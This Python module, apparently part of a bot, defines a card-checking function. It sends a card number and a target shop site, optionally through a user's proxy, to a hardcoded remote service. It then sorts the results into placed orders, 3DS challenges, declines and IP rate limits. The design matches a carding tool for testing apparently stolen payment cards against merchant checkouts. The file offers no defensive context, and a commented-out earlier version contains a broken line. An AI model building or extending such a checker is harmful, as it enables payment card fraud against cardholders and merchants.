import json
import httpx
import asyncio
from BOT.tools.proxy import get_proxy

def get_site(user_id):
    with open("DATA/sites.json", "r") as f:
        sites = json.load(f)
    return sites.get(str(user_id), {}).get("site")

# async def check_card(user_id, cc, site=None):
#     if not site:
#         site = get_site(user_id)
#     if not site:
#         return "Site Not Found"

#     proxy = get_proxy(user_id)
    
#     if proxy:
#         url = f"http://69.62.117.8:8000/check?card={cc}&site={site}&proxy={proxy}"
#     else:
#         url = f"http://69.62.117.8:8000/check?card={cc}&site={site}"

#     try:
#         async with httpx.AsyncClient(timeout=100.0) as client:
#             response = await client.get(url)
#             data = response.json()

#             print(data)

#     except httpx.ReadTimeout:
#         return "Request Timeout"
#     except Exception:
#         return "Request Failed"

#     response_text = data.get("Response", "").upper()

#     if "Server disconnected without sending a response." in response_text


#     price = data.get("Price", "")
#     cc_field = data.get("cc")

#     # if cc_field:
#     if price and f"ORDER_PLACED".upper() in response_text:
#         return "ORDER_PLACED"
#     elif "3DS_REQUIRED" in response_text:
#         return "3DS_REQUIRED"
#     elif "CARD_DECLINED" in response_text:
#         return "CARD_DECLINED"
#     elif "HEADER VALUE MUST BE STR OR BYTES, NOT" in response_text:
#         return "Product ID ⚠️"
#     elif "EXPECTING VALUE: LINE 1 COLUMN 1 (CHAR 0)" in response_text:
#         return "IP Rate Limit"
#     elif "Declined" in response_text:
#         return "Site | Card Error "
#     else:
#         return response_text

async def check_card(user_id, cc, site=None):
    if not site:
        site = get_site(user_id)
    if not site:
        return "Site Not Found"

    proxy = get_proxy(user_id)
    if proxy:
        url = f"http://69.62.117.8:8000/check?card={cc}&site={site}&proxy={proxy}"
    else:
        url = f"http://69.62.117.8:8000/check?card={cc}&site={site}"

    retries = 0
    while retries < 3:
        try:
            async with httpx.AsyncClient(timeout=100.0) as client:
                response = await client.get(url)
                data = response.json()

            if not any(x in data for x in ("CARD_DECLINED", "3DS_REQUIRED")):
                print(data)


            response_text = data.get("Response", "").upper()

            if (
                "SERVER DISCONNECTED WITHOUT SENDING A RESPONSE" in response_text
                or "PEER CLOSED CONNECTION WITHOUT SENDING COMPLETE MESSAGE BODY (INCOMPLETE CHUNKED READ)" in response_text
                or "552 CONNECTION ERROR" in response_text
            ):
                retries += 1
                continue  # try again
            break  # if no disconnect error, break

        except Exception:
            return "Connection Failed"

    if retries == 3:
        return "Connection Failed"

    # Response parsing below
    price = data.get("Price", "")
    cc_field = data.get("cc")

    if price and "ORDER_PLACED" in response_text:
        return "ORDER_PLACED"
    elif "3DS_REQUIRED" in response_text:
        return "3DS_REQUIRED"
    elif "CARD_DECLINED" in response_text:
        return "CARD_DECLINED"
    elif "HEADER VALUE MUST BE STR OR BYTES, NOT" in response_text:
        return "Product ID ⚠️"
    elif "EXPECTING VALUE: LINE 1 COLUMN 1 (CHAR 0)" in response_text:
        return "IP Rate Limit"
    elif "DECLINED" in response_text:
        return "Site | Card Error"
    else:
        return response_text
